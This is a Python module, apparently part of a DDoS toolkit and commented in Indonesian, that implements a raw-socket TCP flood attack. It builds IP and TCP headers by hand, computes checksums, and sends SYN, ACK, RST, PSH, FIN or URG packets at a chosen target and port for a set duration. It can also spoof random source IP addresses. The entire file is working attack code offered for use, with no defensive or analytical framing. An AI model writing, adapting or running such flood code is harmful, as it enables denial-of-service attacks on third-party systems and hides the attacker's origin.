import socket
import struct
import time
import logging
import random
from utils import spoofing, adaptive

log = logging.getLogger(__name__)

def attack(target, port, duration, flood_type="SYN", spoof=False):
    start_time = time.time()
    end_time = start_time + duration
    packets_sent = 0

    try:
        while time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

                # --- IP Header ---
                ip_version = 4
                ip_ihl = 5
                ip_tos = 0
                ip_total_length = 0  # Kernel yang mengisi
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                ip_ttl = random.randint(64,255)
                ip_protocol = socket.IPPROTO_TCP
                ip_checksum = 0

                if spoof:
                    ip_saddr = spoofing.generate_random_ip()
                else:
                    ip_saddr = "192.168.1.100"  # Ganti dengan IP Anda jika tidak spoof

                ip_daddr = socket.inet_aton(target)

                ip_header = struct.pack('!BBHHHBBH4s4s', (ip_version << 4) + ip_ihl, ip_tos, ip_total_length,
                                        ip_id, ip_frag_off, ip_ttl, ip_protocol, ip_checksum,
                                        socket.inet_aton(ip_saddr), ip_daddr)

                # --- TCP Header ---
                tcp_source_port = random.randint(1024, 65535)
                tcp_dest_port = port
                tcp_seq = random.randint(0, 4294967295)
                tcp_ack_seq = 0
                tcp_doff = 5

                # Set flag TCP
                tcp_flags = 0
                if flood_type == "SYN":
                    tcp_flags = 0b00000010
                elif flood_type == "ACK":
                    tcp_flags = 0b00010000
                elif flood_type == "RST":
                    tcp_flags = 0b00000100
                elif flood_type == "PSH":
                    tcp_flags = 0b00001000
                elif flood_type == "FIN":
                    tcp_flags = 0b00000001
                elif flood_type == "URG":
                    tcp_flags = 0b00100000

                tcp_window = socket.htons(5840)
                tcp_checksum = 0
                tcp_urg_ptr = 0

                tcp_header = struct.pack('!HHLLBBHHH', tcp_source_port, tcp_dest_port, tcp_seq, tcp_ack_seq,
                                        (tcp_doff << 4) + 0, tcp_flags, tcp_window, tcp_checksum, tcp_urg_ptr)

                # --- Pseudo Header (untuk checksum) ---
                placeholder = 0
                protocol = socket.IPPROTO_TCP
                tcp_length = len(tcp_header)
                psh = struct.pack('!4s4sBBH', socket.inet_aton(ip_saddr), socket.inet_aton(target), placeholder, protocol, tcp_length)
                psh = psh + tcp_header

                tcp_checksum = checksum(psh)

                # --- Buat Ulang TCP Header dengan Checksum ---
                tcp_header = struct.pack('!HHLLBBH', tcp_source_port, tcp_dest_port, tcp_seq, tcp_ack_seq,
                                        (tcp_doff << 4) + 0, tcp_flags, tcp_window) + struct.pack('H', tcp_checksum) + struct.pack('!H', tcp_urg_ptr)

                # --- Kirim Paket ---
                packet = ip_header + tcp_header
                s.sendto(packet, (target, 0))
                packets_sent += 1

            except socket.error as e:
                log.error(f"Socket error: {e}")
                break #Langsung keluar dari loop
            except Exception as e:
                log.exception(f"An unexpected error occurred: {e}")
                break

    except KeyboardInterrupt:
        pass
    finally:
        if 's' in locals() and s:
            s.close()
        log.info(f"TCP flood attack finished. Sent {packets_sent} packets.")


def checksum(msg):
    s = 0
    if len(msg) % 2 != 0:
        msg += b'\0'
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + msg[i+1]
        s = s + w
    s = (s>>16) + (s & 0xffff)
    s = s + (s >> 16)
    s = ~s & 0xffff
    return s